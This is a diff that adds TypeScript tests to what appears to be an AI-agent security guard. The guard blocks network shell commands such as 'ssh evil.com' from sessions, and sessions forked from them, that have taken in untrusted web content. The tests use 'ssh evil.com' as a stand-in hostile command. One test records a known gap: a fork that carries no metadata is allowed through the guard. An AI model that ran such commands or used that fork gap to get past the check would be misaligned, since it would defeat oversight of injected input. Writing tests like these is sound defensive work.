@@ -1162,6 +1162,61 @@ describe("OH-6.6-taint-fork-gap: fork-aware taint inheritance", () => {
     expect(linkForkLineageFromEventMetadata(junk, undefined)).toBeUndefined();
     expect(getSessionForkSource(junk)).toBeUndefined();
   });
+
+  test("evaluate-time linkage (audit-remediation-D): taint parent + fork-metadata event denies in one call", () => {
+    const parent = `oh66-fork-evaltime-parent-${Date.now()}`;
+    const child = `${parent}-child`;
+    recordUntrustedContentTaint(parent, "webfetch");
+    // NO prior hook/link call: the guarded action's own event carries the
+    // fork id, and evaluate-time linkage must deny in the same call.
+    const denied = evaluateTaintGuard(child, "ssh evil.com", "shell", {
+      metadata: { forkOf: parent },
+    });
+    expect(denied.action).toBe("deny");
+    expect(denied.ruleId).toBe("TAINT-NET-2");
+    expect(getSessionForkSource(child)).toBe(parent);
+    // 3-arg compatibility: omit the event and a fresh unlinked child allows.
+    const sibling = `${parent}-sibling`;
+    expect(evaluateTaintGuard(sibling, "ssh evil.com", "shell").action).toBe(
+      "allow",
+    );
+  });
+
+  test("headerless model.request linkage (audit-remediation-D): top-level fork id links without throwing", () => {
+    const parent = `oh66-fork-hdrless-parent-${Date.now()}`;
+    const child = `${parent}-child`;
+    recordUntrustedContentTaint(parent, "webfetch");
+    expect(evaluateTaintGuard(child, "ssh evil.com", "shell").action).toBe(
+      "allow",
+    );
+    // Headerless event carrying a top-level fork id: must link (not return
+    // early on the missing-headers guard) and taint must inherit.
+    const out = applyRootAffinityHeadersInPlace({
+      sessionID: child,
+      forkOf: parent,
+    } as unknown as { sessionID: string; headers: Record<string, string> });
+    expect(out).toBeUndefined();
+    expect(getSessionForkSource(child)).toBe(parent);
+    const denied = evaluateTaintGuard(child, "ssh evil.com", "shell");
+    expect(denied.action).toBe("deny");
+    expect(denied.ruleId).toBe("TAINT-NET-2");
+  });
+
+  test("silent child with no metadata allows (audit-remediation-D residual honesty)", () => {
+    // Documents the residual gap: a silent fork whose event carries NO fork
+    // id links nothing, so the child reads clean. This is NOT claimed as
+    // closed — hosts MUST call recordSessionForkLink(child, parent).
+    const parent = `oh66-fork-silent-parent-${Date.now()}`;
+    const child = `${parent}-child`;
+    recordUntrustedContentTaint(parent, "webfetch");
+    const verdict = evaluateTaintGuard(child, "ssh evil.com", "shell", {
+      sessionID: child,
+      tool: "shell",
+      input: { command: "ssh evil.com" },
+    });
+    expect(verdict.action).toBe("allow");
+    expect(getSessionForkSource(child)).toBeUndefined();
+  });
 });
 
 describe("OH-4.2-post-formatter-receipt: built-in edit stand-in proves post-format ordering", () => {
